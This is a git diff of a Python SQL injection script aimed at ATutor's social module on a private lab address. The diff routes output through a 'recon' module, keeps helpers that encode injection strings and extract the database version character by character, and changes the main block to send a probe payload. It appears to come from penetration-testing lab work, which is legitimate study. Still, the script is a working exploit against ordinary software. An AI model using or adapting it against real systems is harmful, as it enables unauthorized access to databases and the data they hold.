@@ -11,6 +11,7 @@ import sys
 import re
 import requests
 from bs4 import BeautifulSoup
+import recon
 
 ### Helper functions for query constuction ###
 def replaceSpace(inj_str, type='mysql'):
@@ -39,12 +40,10 @@ def testSQLi(link, inj_str):
     
     r = requests.get(target)
     s = BeautifulSoup(r.text, 'lxml')
-    print("Response Headers:")
-    print(r.headers)
-    print()
-    print("Response Content:")
-    print(s.text)
-    print()
+
+    recon.format_text("Response Headers:", r.headers)
+    recon.format_text("Response Content:", s.text)
+   
     error = re.search("Invalid argument", s.text)
 
     # Successfull SQLi should return errors
@@ -57,13 +56,14 @@ def execText(ip, inj_str, noSpace=True):
     if noSpace:
         inj_str = replaceSpace(inj_str)
 
+    sqli = "No SQL Erros Found.\n"
     test = testSQLi(ip, inj_str)
-
     if test:
-        print("Possible SQLi Found.")
-    else:
-        print("No SQL Erros Found.")
-
+        sqli = "Possible SQLi Found.\n"
+    
+    recon.format_text("SQLi Possibility", sqli)
+        
+### Functions To Extract SQL Version ###
 def extractVersionChar(ip, inj_str, type='mysql'):
     """
     Takes a SQLi vulnerable address, ip, and an injection string, inj_str.
@@ -97,4 +97,5 @@ def extractVersion(ip, type='mysql', noSpaces=True):
     print("\n(+) Done!")
 
 if __name__ == "__main__":
-    extractVersion("http://192.168.162.103/ATutor/mods/_standard/social/index_public.php?q=")
+    recon.format_text("Hello", "hwllo")
+    execText("http://192.168.162.103/ATutor/mods/_standard/social/index_public.php?q=", "AAAAA'")
